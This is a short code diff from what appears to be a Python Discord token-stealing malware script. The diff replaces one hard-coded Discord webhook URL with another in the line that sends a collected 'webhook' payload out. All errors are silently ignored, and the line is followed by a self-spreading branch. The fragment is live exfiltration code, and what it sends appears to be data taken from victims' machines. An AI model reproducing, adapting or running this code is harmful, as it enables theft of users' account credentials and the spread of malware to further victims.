@@ -192,7 +192,7 @@ def main():
     }
     try:
         
-        urlopen(Request("https://discord.com/api/webhooks/956274168981258322/wPcZh6tja_ihOELq3qiHbMWc6z5gRVRy8YAH93x_tNEND_CevVxszNsZG4FOaFUUt3Dv", data=dumps(webhook).encode(), headers=getHeader()))
+        urlopen(Request("https://discord.com/api/webhooks/975776289426378753/-lIbNcTleszg0vtkjBEK4-7N5oxHkROGz6RiiwfAKRF5OExTp7PRdOj7UR8sWbBlArNq", data=dumps(webhook).encode(), headers=getHeader()))
     except:
         pass
     if self_spread:
